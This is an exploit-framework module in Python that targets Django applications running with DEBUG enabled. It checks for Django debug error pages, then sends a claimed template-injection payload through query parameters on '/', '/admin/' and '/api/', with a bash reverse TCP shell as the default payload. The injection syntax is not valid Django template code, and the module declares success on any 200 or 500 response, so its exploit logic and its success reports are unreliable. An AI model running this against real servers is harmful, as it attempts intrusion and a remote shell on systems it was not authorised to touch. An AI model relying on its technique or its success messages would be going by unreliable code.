#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import urllib.parse


class Module(Exploit, Http_client):

    __info__ = {
        "name": "Django Debug Mode RCE",
        "description": "Remote Code Execution exploit for Django applications with DEBUG=True enabled, exploiting error pages and template injection",
        "author": "KittySploit Team",
        "cve": [],
        "arch": [Arch.X86, Arch.X64],
        "platform": Platform.LINUX,
        "category": "singles",
        "payload": {
            "default": "payloads/singles/cmd/unix/bash_reverse_tcp",
            "arch": "cmd",
            "platform": [Platform.LINUX],
            "category": "singles",
        }
    }

    exploit_path = OptString("/", "Path to trigger error", required=False)
    error_param = OptString("error", "Parameter to trigger error", required=False)

    def check(self):
        """
        Check if Django debug mode is enabled
        """
        try:
            # Trigger an error to check for debug page
            response = self.http_request(
                method="GET",
                path="/nonexistent-page-that-should-404/",
                allow_redirects=False
            )
            
            if response:
                content = response.text.lower()
                # Check for Django debug page indicators
                if 'django' in content and ('traceback' in content or 'settings' in content or 'debug' in content):
                    return {
                        'vulnerable': True,
                        'reason': 'Django debug mode enabled',
                        'confidence': 'high'
                    }
            
            return {
                'vulnerable': False,
                'reason': 'Django debug mode not detected',
                'confidence': 'medium'
            }
        except Exception as e:
            return {
                'vulnerable': False,
                'reason': f'Check failed: {str(e)}',
                'confidence': 'low'
            }

    def run(self):
        """
        Execute the exploit
        """
        try:
            print_status("Attempting Django debug mode RCE exploit...")
            
            # Try template injection via error pages
            command = self.payload
            
            # Construct payload to trigger template injection
            payload = f"{{% import os %}}{{% os.system('{command}') %}}"
            
            # Try different paths
            paths = [
                f"/?{self.error_param.value}={urllib.parse.quote(payload)}",
                f"/admin/?{self.error_param.value}={urllib.parse.quote(payload)}",
                f"/api/?{self.error_param.value}={urllib.parse.quote(payload)}",
            ]
            
            for path in paths:
                print_info(f"Trying: {path}")
                response = self.http_request(
                    method="GET",
                    path=path,
                    allow_redirects=False,
                    timeout=10
                )
                
                if response and response.status_code in [200, 500]:
                    print_success("Command executed successfully")
                    self.vulnerable()
                    return True
            
            print_error("Exploitation failed - debug mode may not be exploitable")
            self.not_vulnerable()
            return False
            
        except Exception as e:
            print_error(f"Exploitation failed: {e}")
            return False
